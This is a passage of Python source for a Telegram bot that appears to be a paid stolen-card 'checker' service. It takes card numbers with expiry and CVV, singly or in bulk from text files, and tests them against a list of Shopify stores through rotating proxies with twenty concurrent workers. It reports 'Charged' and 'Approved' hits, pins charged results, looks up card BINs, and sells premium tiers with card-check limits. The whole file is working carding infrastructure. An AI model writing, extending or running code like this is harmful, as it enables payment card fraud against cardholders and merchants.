    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
    
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')
    
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.answer(premium_emoji("❌ Access Denied. Admin only."), alert=True)
        return
    
    admin_text = """👑 Admin Panel

📋 Premium Management
├─ <code>/addid user_id 1</code>  → 🥉 Basic (1d, 500 CC)
├─ <code>/addid user_id 5</code>  → 🥈 Standard (5d, 1000 CC)
├─ <code>/addid user_id 15</code> → 🥇 Premium (15d, 2000 CC)
├─ <code>/addid user_id 30</code> → 👑 VIP (30d, 5000 CC)
├─ <code>/addid user_id -1</code> → ♾️ Lifetime (10000 CC)
├─ <code>/kick user_id</code> → Remove user from premium
└─ <code>/list</code> → List all premium users

🌐 Sites Management
├─ <code>/addsites</code> → Reply to .txt file to upload sites
├─ <code>/site</code> → Check & remove dead sites
└─ <code>/rm url</code> → Remove a specific site

🔌 Proxy Management
├─ <code>/proxy</code> → Check & remove dead proxies
├─ <code>/getproxy</code> → Get all proxies
└─ <code>/clearproxy</code> → Clear all proxies

📊 Bot Statistics
└─ <code>/stats</code> → Show bot statistics"""

    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
    
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')
    
@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   ➥ Add proxy: <code>/addproxy</code>
   ➥ Check Single: <code>/sh card|mm|yy|cvv</code>
   ➥ Check Mass: <code>/chk .txt check</code>
   ➥ Plan: <code>/plan</code>

💡 Made by  @Phantxdead_XD"""
    
    buttons = get_main_menu_keyboard(user_id)
    
    await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^[/.]sh(?:\s|$)'))
async def single_cc_check(event):
    user_id = event.sender_id
    chat_id = event.chat_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    # /sh free hai sirf us channel me jiska link diya hai
    # DM ya dusri jagah se use karna ho toh premium chahiye
    is_free_channel = (chat_id == FREE_CHANNEL_ID)

    if not is_free_channel and not is_premium(user_id):
        await event.reply(
            premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."),
            parse_mode='html'
        )
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    # Direct command ya reply dono se CC extract karo
    text_after_cmd = event.message.text.split(' ', 1)
    if len(text_after_cmd) > 1 and text_after_cmd[1].strip():
        cc_input = text_after_cmd[1].strip()
    elif event.reply_to_msg_id:
        reply_msg = await event.get_reply_message()
        cc_input = reply_msg.text or ''
    else:
        await event.reply(premium_emoji("❌ Usage: <code>/sh card|mm|yy|cvv</code> ya kisi CC message ko reply karo"), parse_mode='html')
        return
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/sh card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]

    processing_text = f"""⏳ 𝐏 𝐇 𝐀 𝐍 𝐓 〆 𝐕𝟐 𝗜𝗦 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 . . . .

💳 Card    » <code>{card}</code>
🌐 Gateway » 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 
🔍 Status  » 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚...

⚡ Powered by  @Phantxdead_XD"""

    status_msg = await event.reply(premium_emoji(processing_text), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_header = "💎 𝑪𝑯𝑨𝑹𝑮𝑬𝑫"
        elif result['status'] == 'Approved':
            status_header = "✅ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫"
        else:
            status_header = "❌ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫"

        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

🛒 Gateway {result.get('gateway', 'Unknown')}
📝 Response {result['message'][:150]}
💸 Price {result.get('price', '-')}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}

💡 Made by  @Phantxdead_XD"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

        # Charged ho toh message pin karo
        if result['status'] == 'Charged':
            try:
                await bot.pin_message(event.chat_id, status_msg.id, notify=False)
            except:
                pass

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^[/.]chk(?:\s|$)'))
async def check_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id
    is_group = chat_id != user_id  # group/channel = True, DM = False
    is_free_channel = is_group and (chat_id == FREE_CHANNEL_ID)
    is_prem = is_premium(user_id)

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    # Access check
    if is_group:
        if not is_prem and not is_free_channel:
            await event.reply(premium_emoji(f"❌ Access Denied\n\nThis bot only works in the official channel.\n\n🆔 Chat ID: <code>{chat_id}</code>\n✅ Required: <code>{FREE_CHANNEL_ID}</code>"), parse_mode='html')
            return
    else:
        # DM — premium only
        if not is_prem:
            await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
            return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return

    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    status_msg = await safe_send(event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html'), user_id=user_id)

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return

    # Limit set karo
    if is_group and not is_prem:
        chk_limit = 100  # free user group limit
    else:
        chk_limit = get_user_chk_limit(user_id)

    if len(cards) > chk_limit:
        await status_msg.edit(premium_emoji(f"⚠️ File contains {len(cards)} cards. Your limit is {chk_limit}. Checking first {chk_limit} only."), parse_mode='html')
        cards = cards[:chk_limit]

    os.remove(file_path)

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔥𝗖𝗵𝗲𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱 • {total_cards} 𝗖𝗮𝗿𝗱𝘀 𝗤𝘂𝗲𝘂𝗲𝗱..."), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time(),
        'last_card': '',
        'last_response': '',
        'last_price': '-',
        'last_gateway': 'Unknown'
    }

    # Where to show progress & results
    # Free user (group): everything in group, unmasked
    # Premium user (group): progress in group masked, hits+result in DM unmasked
    # Premium user (DM): everything in DM unmasked
    result_target = user_id if (is_prem and is_group) else chat_id
    mask_in_progress = is_prem and is_group  # premium group = masked progress

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)

        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return

                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break

                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=3)

                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_response'] = res.get('message', '')[:50]
                all_results['last_price'] = res.get('price', '-')
                all_results['last_gateway'] = res.get('gateway', 'Unknown')

                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    # Premium group → hit DM mein, free group → hit group mein
                    if is_prem and is_group:
                        await send_realtime_hit(user_id, res, 'Charged', username)
                    elif not is_prem:
                        await send_realtime_hit_to(chat_id, res, 'Charged', username)
                    else:
                        await send_realtime_hit(user_id, res, 'Charged', username)

                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    if not res.get('silent', False):
                        if is_prem and is_group:
                            await send_realtime_hit(user_id, res, 'Approved', username)
                        elif not is_prem:
                            await send_realtime_hit_to(chat_id, res, 'Approved', username)
                        else:
                            await send_realtime_hit(user_id, res, 'Approved', username)
                else:
                    all_results['dead'].append(res)

                queue.task_done()

                now = time.time()
                if now - last_update_time[0] >= 2.5:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress_v2(user_id, status_msg.id, all_results, all_results['checked'], chat_id, mask_in_progress)
                        except Exception:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(20)]

        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_key in active_sessions:
            await update_progress_v2(user_id, status_msg.id, all_results, all_results['checked'], chat_id, mask_in_progress)

    except Exception as e:
        await safe_send(bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html'), user_id=user_id)
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await status_msg.delete()
        except:
            pass

        # Premium group → final result DM mein, baki sab → same chat mein
        await send_final_results(result_target, all_results)

@bot.on(events.NewMessage(pattern=r'^[/.]bin(?:\s|$)'))
async def bin_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    text = event.message.text.split(' ', 1)
    if len(text) < 2 or not text[1].strip():
        await event.reply(premium_emoji("❌ Usage: <code>/bin 444488</code>"), parse_mode='html')
        return

    bin_input = text[1].strip()
    # Sirf digits nikalo, pehle 6 lo
    digits_only = re.sub(r'\D', '', bin_input)
    bin_number = digits_only[:6]

    if len(bin_number) < 6:
        await event.reply(premium_emoji("❌ Kam se kam 6 digits chahiye."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking BIN <code>{bin_number}</code>..."), parse_mode='html')

    try:
        timeout = aiohttp.ClientTimeout(total=15)
        session = await get_http_session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        async with session.get(f'https://api.juspay.in/cardbins/{bin_number}', timeout=timeout, headers=headers, ssl=False) as resp:
            response_text = await resp.text()
            try:
                data = json.loads(response_text)
            except:
                data = {}
            
            if not data or resp.status != 200:
                await status_msg.edit(premium_emoji(f"❌ BIN not found or API error"), parse_mode='html')
                return

        card_type = data.get('type', '-')
        card_sub_type = data.get('card_sub_type', '-')
        extended_type = data.get('extended_card_type', '-')
        issuing_bank = data.get('bank', '-')
        card_brand = data.get('brand', '-')
        country = data.get('country', '-')
        country_code = data.get('country_code', '-')
        category = data.get('card_sub_type_category', '-')

        result = f"""🔍 BIN Lookup

💳 BIN » <code>{bin_number}</code>
🏦 Bank » {issuing_bank}
🌍 Country » {country} ({country_code})
💠 Brand » {card_brand}
📝 Type » {extended_type} - {card_sub_type}
📋 Category » {category}

💡 Made by @Phantxdead_XD"""

        await status_msg.edit(premium_emoji(result), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    try:
        raw_lines = []

        # .txt file reply support
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg.file and reply_msg.file.name and reply_msg.file.name.endswith('.txt'):
                file_path = await reply_msg.download_media()
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                os.remove(file_path)
                raw_lines = [line.strip() for line in content.splitlines() if line.strip()]
            else:
                await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
                return
        else:
            # Direct text me proxies
            args = event.message.text.split('\n')
            raw_lines = [line.strip() for line in args[1:] if line.strip()]

        if not raw_lines:
            await event.reply(premium_emoji(
                "❌ No proxies found!\n\n"
                "Usage:\n"
                "1. <code>/addproxy</code> reply to .txt file\n"
                "2. <code>/addproxy</code>\n<code>ip:port:user:pass</code>"
            ), parse_mode='html')
            return

        # Normalize all proxies
        normalized = []
        invalid = 0
        for line in raw_lines:
            norm = normalize_proxy(line)
            if norm:
                normalized.append(norm)
            else:
                invalid += 1

        if not normalized:
            await event.reply(premium_emoji("❌ No valid proxies found. Check format."), parse_mode='html')
            return

        # Duplicates hata do
        current_proxies = load_proxies()
        to_test = [p for p in normalized if p not in current_proxies]

        if not to_test:
            await event.reply(premium_emoji("⚠️ All proxies already exist."), parse_mode='html')
            return

        # Status msg
        status_msg = await event.reply(premium_emoji(
            f"🔄 Testing {len(to_test)} proxies before adding...\n⏳ Please wait..."
        ), parse_mode='html')

        # Batch test
        alive_proxies = []
        dead_count = 0
        batch_size = 50

        for i in range(0, len(to_test), batch_size):
            batch = to_test[i:i + batch_size]
            tasks = [test_proxy(p) for p in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_count += 1

            checked = len(alive_proxies) + dead_count
            await safe_send(status_msg.edit(premium_emoji(
                f"🔄 Testing proxies...\n\n"
                f"✅ Alive  » {len(alive_proxies)}\n"
                f"❌ Dead   » {dead_count}\n"
                f"📊 Progress » {checked}/{len(to_test)}"
            ), parse_mode='html'), user_id=user_id)

        if not alive_proxies:
            await status_msg.edit(premium_emoji(
                f"❌ No alive proxies found!\n\n"
                f"📊 Tested: {len(to_test)}\n"
                f"❌ All Dead: {dead_count}"
            ), parse_mode='html')
            return

        # Sirf alive wale add karo
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        msg = f"✅ Added {len(alive_proxies)} alive proxies!\n\n"
        msg += f"📊 Tested: {len(to_test)}\n"
        msg += f"✅ Alive (added): {len(alive_proxies)}\n"
        msg += f"❌ Dead (skipped): {dead_count}"
        if invalid:
            msg += f"\n⚠️ Invalid format: {invalid}"

        await status_msg.edit(premium_emoji(msg), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ proxy.txt is empty."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(
        f"🔄 Proxy Check Started...\n\n"
        f"📊 Total: {len(proxies)}\n"
        f"⏳ Please wait..."
    ), parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            checked = len(alive_proxies) + len(dead_proxies)
            await status_msg.edit(premium_emoji(
                f"🔄 Checking Proxies...\n\n"
                f"✅ Alive  » {len(alive_proxies)}\n"
                f"❌ Dead   » {len(dead_proxies)}\n"
                f"📊 Progress » {checked}/{len(proxies)}"
            ), parse_mode='html')

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        await status_msg.edit(premium_emoji(
            f"✅ Proxy Check Complete!\n\n"
            f"📊 Total    » {len(proxies)}\n"
            f"✅ Alive    » {len(alive_proxies)}\n"
            f"❌ Removed  » {len(dead_proxies)}\n\n"
            f"⚡ Powered by @Phantxdead_XD"
        ), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    removed_text = "\n".join(removed[:10])
    await event.reply(premium_emoji(f"✅ Removed {len(removed)} proxies!\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ proxy.txt is already empty."), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"📦 Backup created!\n\nSending backup of {count} proxies..."), file=backup_filename, parse_mode='html')

        try:
            os.remove(backup_filename)
        except:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ Cleared all {count} proxies!\n\nproxy.txt is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ sites.txt is empty."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(
        f"🔄 Site Check Started...\n\n"
        f"📊 Total: {len(sites)}\n"
        f"⏳ Please wait..."
    ), parse_mode='html')

    alive_sites = []
    dead_sites = []
    alive_details = []
    dead_details = []
    batch_size = 10

    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies

            tasks = [test_site(site, [random.choice(fresh_proxies), random.choice(fresh_proxies)], fresh_proxies) for site in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                gw = res.get('gateway', '-')
                pr = res.get('price', '-')
                rsp = res.get('response', '-')
                line = f"{res['site']} | {gw} | {pr} | {rsp}"
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                    alive_details.append(line)
                else:
                    dead_sites.append(res['site'])
                    dead_details.append(line)

            checked = len(alive_sites) + len(dead_sites)
            await status_msg.edit(premium_emoji(
                f"🔄 Checking Sites...\n\n"
                f"✅ Alive  » {len(alive_sites)}\n"
                f"❌ Dead   » {len(dead_sites)}\n"
                f"📊 Progress » {checked}/{len(sites)}"
            ), parse_mode='html')

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        await status_msg.edit(premium_emoji(
            f"✅ Site Check Complete!\n\n"
            f"📊 Total    » {len(sites)}\n"
            f"✅ Alive    » {len(alive_sites)}\n"
            f"❌ Removed  » {len(dead_sites)}\n\n"
            f"⚡ Powered by @Phantxdead_XD"
        ), parse_mode='html')

        # Alive txt
        if alive_details:
            alive_file = f"alive_sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            async with aiofiles.open(alive_file, 'w') as f:
                await f.write("\n".join(alive_details))
            await bot.send_file(event.chat_id, alive_file, caption=premium_emoji(f"✅ Alive Sites ({len(alive_details)})"), parse_mode='html')
            try:
                os.remove(alive_file)
            except:
                pass

        # Dead txt
        if dead_details:
            dead_file = f"dead_sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            async with aiofiles.open(dead_file, 'w') as f:
                await f.write("\n".join(dead_details))
            await bot.send_file(event.chat_id, dead_file, caption=premium_emoji(f"❌ Dead Sites ({len(dead_details)})"), parse_mode='html')
            try:
                os.remove(dead_file)
            except:
                pass

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    try:
        url_to_remove = event.message.text.split(' ', 1)[1].strip()
        if not url_to_remove:
            await event.reply(premium_emoji("❌ Usage: <code>/rm https://site.com</code>"), parse_mode='html')
            return

        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found: <code>{url_to_remove}</code>"), parse_mode='html')
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ Site removed!\n\n<code>{url_to_remove}</code>"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        
        
@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📝 Please reply to a .txt file with the command:\n<code>/addsites</code>"), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("🔄 Processing sites file..."), parse_mode='html')
    
    try:
        file_path = await reply_msg.download_media()
        
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            sites = [line.strip() for line in content.splitlines() if line.strip()]
        
        os.remove(file_path)
        
        if not sites:
            await status_msg.edit(premium_emoji("❌ No valid sites found in file."), parse_mode='html')
            return
        
        await status_msg.edit(premium_emoji(f"🔄 Checking {len(sites)} sites before adding..."), parse_mode='html')
        
        proxies = load_proxies()
        if not proxies:
            await status_msg.edit(premium_emoji("❌ No proxies available to test sites."), parse_mode='html')
            return
        
        alive_sites = []
        dead_sites = []
        batch_size = 10
        
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            tasks = [test_site(site, [random.choice(proxies), random.choice(proxies)], proxies) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await status_msg.edit(premium_emoji(f"🔄 Checking sites...\n\nChecked: {len(alive_sites) + len(dead_sites)}/{len(sites)}\n✅ Alive: {len(alive_sites)}\n❌ Dead: {len(dead_sites)}"), parse_mode='html')
        
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        
        result_text = f"""✅ <b>Sites updated successfully!</b>

📊 Total sites received: {len(sites)}
✅ Alive (added): {len(alive_sites)}
❌ Dead (ignored): {len(dead_sites)}

🌐 <b>Added sites:</b>
{chr(10).join([f"• {s}" for s in alive_sites[:5]])}{'...' if len(alive_sites) > 5 else ''}"""

        await status_msg.edit(premium_emoji(result_text), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        
        
@bot.on(events.NewMessage(pattern=r'^[/.]addid(?:\s|$)'))
async def add_premium_command(event):
    if event.sender_id not in ADMIN_ID:
        return

    # Days → Plan mapping
    DAYS_TO_PLAN = {
        '1':  ('basic',    500,   '🥉'),
        '5':  ('standard', 1000,  '🥈'),
        '15': ('premium',  2000,  '🥇'),
        '30': ('vip',      5000,  '👑'),
        '-1': ('lifetime', 10000, '♾️'),
    }

    args = event.message.text.split()
    if len(args) < 3:
        await event.reply(premium_emoji(
            "📝 Usage:\n"
            "<code>/addid user_id 1</code>  — 🥉 Basic (1 day, 500 CC)\n"
            "<code>/addid user_id 5</code>  — 🥈 Standard (5 days, 1000 CC)\n"
            "<code>/addid user_id 15</code> — 🥇 Premium (15 days, 2000 CC)\n"
            "<code>/addid user_id 30</code> — 👑 VIP (30 days, 5000 CC)\n"
            "<code>/addid user_id -1</code> — ♾️ Lifetime (10000 CC)"
        ), parse_mode='html')
        return

    user_id_to_add = args[1].strip()
    days_arg = args[2].strip()

    if not user_id_to_add.lstrip('-').isdigit():
        await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')
        return

